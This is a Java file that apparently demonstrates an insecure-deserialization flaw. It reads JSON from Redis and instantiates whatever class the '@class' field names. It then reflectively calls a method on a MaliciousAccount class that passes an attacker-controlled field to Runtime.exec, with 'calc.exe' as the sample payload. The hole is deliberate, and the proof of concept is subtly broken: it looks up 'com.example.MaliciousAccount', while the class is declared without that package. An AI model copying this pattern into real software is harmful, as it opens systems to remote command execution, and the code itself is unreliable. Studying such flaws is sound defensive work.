import com.alibaba.fastjson.JSONObject;
import redis.clients.jedis.Jedis;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Map;

public class WebCrawler {
    private Jedis jedis;
    private HttpClient httpClient;

    public WebCrawler() {
        this.jedis = new Jedis("localhost", 6379);
        this.httpClient = HttpClient.newHttpClient();
    }

    public String crawlPage(String url) throws IOException, InterruptedException {
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .build();
        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
        return response.body();
    }

    public void insertAccount(String dbKey, String jsonData) {
        jedis.set(dbKey.getBytes(), jsonData.getBytes());
    }

    public void updateAccount(String dbKey) {
        byte[] data = jedis.get(dbKey.getBytes());
        if (data != null) {
            // 不安全的反序列化操作
            JSONObject obj = JSONObject.parseObject(new String(data));
            try {
                Class<?> clazz = Class.forName(obj.getString("@class"));
                Object account = JSONObject.parseObject(new String(data), clazz);
                Method method = clazz.getMethod("updateStatus", String.class);
                method.invoke(account, "MALICIOUS");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws Exception {
        WebCrawler crawler = new WebCrawler();
        String htmlContent = crawler.crawlPage("http://example.com/accounts/1");
        
        // 模拟存储数据到Redis
        String maliciousJson = "{\\"@class\\":\\"com.example.MaliciousAccount\\",\\"command\\":\\"calc.exe\\"}";
        crawler.insertAccount("account:1", maliciousJson);
        
        // 漏洞触发点
        crawler.updateAccount("account:1");
    }
}

class MaliciousAccount {
    private String command;

    public void updateStatus(String status) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getCommand() {
        return command;
    }

    public void setCommand(String command) {
        this.command = command;
    }
}